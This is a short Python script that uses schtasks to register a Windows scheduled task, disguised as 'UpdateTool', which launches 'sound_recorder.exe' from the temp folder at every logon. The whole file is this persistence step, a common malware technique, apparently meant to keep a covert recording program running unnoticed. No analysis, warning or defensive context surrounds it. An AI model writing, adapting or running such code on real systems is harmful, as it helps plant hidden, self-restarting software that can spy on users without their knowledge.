import os
tmp = os.getenv('TMP')
os.system(r'cmd /c "schtasks /create /sc onlogon /tn UpdateTool /tr ' + tmp + r'\UpdateTool\sound_recorder.exe"')
print("fertig")
